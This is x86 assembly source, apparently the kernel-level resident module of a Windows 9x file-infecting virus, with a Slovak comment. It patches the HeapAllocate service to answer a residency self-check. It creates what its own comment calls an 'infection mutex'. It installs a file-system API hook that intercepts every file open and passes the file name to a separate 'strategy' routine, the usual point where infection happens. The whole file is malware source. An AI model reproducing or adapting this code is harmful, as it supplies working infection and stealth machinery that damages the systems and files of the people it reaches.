
ifndef PASS2
include globals.1
else
include globals.2
endif

indep_mod        segment public byte USE32 'CODE'

                 dd   'IMOD'  ; independent module signature

; VMM fz
__HeapAllocate = 4fh
__CreateMutex  = 101h
__EnterMutex   = 12eh
__LeaveMutex   = 12fh

; other fz
_IFSMgr_InstallFileSystemApiHook = 400067h
_IFSMgr_Ring0_FileIO             = 400032h
_UniToBCSPath                    = 400041h

_VxDCall   macro FX
           db 0cdh, 020h
           dd FX
           endm

_VMMCall   macro FX
           _VxDCall <FX+10000h>
           endm

init_res:
res_start:
           cmp  initialize, 0
           je   cont
           mov  invxd_flag, 1
           ret
cont:

           mov   eax, 260
           mod_call md_alloc
           mov   name_buffer, eax

           mov   host_type, HOST_VXD
           cld
           push  0
           push  -1

           _VMMCall __HeapAllocate

@@diz:     add   esp, 8
           mov   eax, dword ptr @@diz-4 ; get indirect ptr to HeapAllocate
           mov   ebx, dword ptr [eax]
           mov   HeapAllocateHook, ebx
           mov   dword ptr [eax], offset cs:NewHeapAllocate

           ; create mutex infection mutex
           push    0
           push    0
           _VMMCall __CreateMutex
           pop     ecx
           pop     ecx

           or      eax, eax
           jz      short vdix
           mov     XMUTEX, eax

           ; set reference to Ring0 functions
           mov     Ring0_FileIO, offset32 cs:VxDs_Ring0_FileIO


           ; install new FileSystem Api Hook
           mov     eax,offset32 cs:newFSApiHook
           push    eax
           _VxDCall _IFSMgr_InstallFileSystemApiHook
           add     esp,4

           cmp     eax,0
           je      short unable_to_install_api_hook

           mov     old_FSApi, eax

           mod_call md_startup

           mov     ss:[esp+4], 'OPEN' ; force module to be opened

unable_to_install_api_hook:
vdix:
           ret

VXDs_Ring0_FileIO:
           _VxDCall _IFSMgr_Ring0_FileIO
           ret


NewHeapAllocate:
           cmp   dword ptr ss:[esp+4], memory2allocate  ; cnt to hook
           jne   short failed
           cmp   dword ptr ss:[esp+8], 0
           jne   short failed
           ; some other checks
           push  eax
           mov   eax, ss:[esp+4]        ; get EIP from stack
           cmp   dword ptr [eax-1eh], 0e855h
           pop   eax
           jne   short failed

           ; return 0 - couldn't allocate ... (self check)
           xor   eax, eax
           ret
failed:
           jmp   dword ptr HeapAllocateHook
HeapAllocateHook dd ?

XMUTEX     dd ?
old_FSApi  dd ?



; Zavola sa s parametrami:
;
;   0     +4  pIFSfunc
;   4     +4  function num
;   8     +4  drive num
;  0c     +4  resource flags
;  10     +4  Code Page
;  14     +4  pIOREQ
;

BeginProc       NewFSApiHook
        push    ebp
        mov     ebp,esp

        pushad
        int 3
        dec     invxd_flag
        jnz     just_in_vxd
        push 0
        push XMUTEX
        _VMMCall __EnterMutex
        pop  ecx
        pop  ecx


        cld
        mov     GET_IN_EBP, ebp

        mov     eax, dword ptr [ebp+0ch]; get service no

        cmp     eax, IFSFN_OPEN         ; open ???
        jne     short no_open


        call    FixNormName


        mov     eax, IFSFN_OPEN
        mov     esi, name_buffer
        int 3
        mod_call md_strategy

        call    execute_service

        mov     ebx, [ebp+1ch]
        mov     ebx, ioreq.ir_fh[ebx]
        mov     eax, IFSFN_OPEN+8000h   ; end open
        mod_call md_strategy
        jmp     end_of_chain
no_open:
no_seek:
end_of_chain:
        cmp     GET_IN_EBP, 0
        je      total_done
; release mutex and execute service
        push XMUTEX
        _VMMCall __LeaveMutex
        pop  ecx
        popad
nfile:
just_in_vxd:
        inc     invxd_flag

        mov     eax,[old_FSApi]
        leave
        jmp     [eax]
        ret

; release mutex and return
total_done:
        push XMUTEX
        _VMMCall __LeaveMutex
        pop  ecx
        inc     invxd_flag
        popad
        leave
        mov     ah, ret_flags
        lahf
        mov     eax, ret_val
        ret

EndProc         NewFSApiHook

invxd_flag db 1
GET_IN_EBP dd 0
ret_val    dd 0
ret_flags  db 0

;=======================================================
execute_service proc near
                push  ebp
                mov   ebp, GET_IN_EBP
                or    ebp, ebp
                jz    just_done

                mov   eax, [old_FSapi]

                push  dword ptr [ebp+1ch]
                push  dword ptr [ebp+18h]
                push  dword ptr [ebp+14h]
                push  dword ptr [ebp+10h]
                push  dword ptr [ebp+0ch]
                push  dword ptr [ebp+8]

                call  [eax]
                push  eax
                sahf
                mov   ret_flags, ah
                pop   eax
                add   esp, 18h

                mov   ret_val, eax
just_done:
                pop   ebp
                mov   GET_IN_EBP, 0
                ret
execute_service endp

;=======================================================
BeginProc       FixNormName
        pushad

        mov     ebx, name_buffer

        mov     eax,[ebp+10h]           ;EAX = Drive Number

        cmp     al,0ffh                 ;UNC Resource ??
        je      short nodrv2
        add     al,'@'                  ;Make drv number alphabetical.

        mov     byte ptr [ebx],al
        inc     ebx
        mov     byte ptr [ebx],':'
        inc     ebx
nodrv2:

        mov     eax,BCS_WANSI
        push    eax

        mov     eax,255
        push    eax

        mov     eax,[ebp+28]                    ;Point to IOREQ
        mov     eax,ioreq.ir_ppath[eax]         ;Path Name
        add     eax,ParsedPath.pp_elements
        push    eax

        push    ebx

        _VxDCall _UniToBCSPath

        add     esp,4*4

        add     ebx,eax
        mov     byte ptr [ebx],0

;        VMMCall _strupr, <NameBuffer>  ; no need to do this

        popad

        ret

EndProc         FixNormName

name_buffer     dd 0

indep_mod       ends

                end

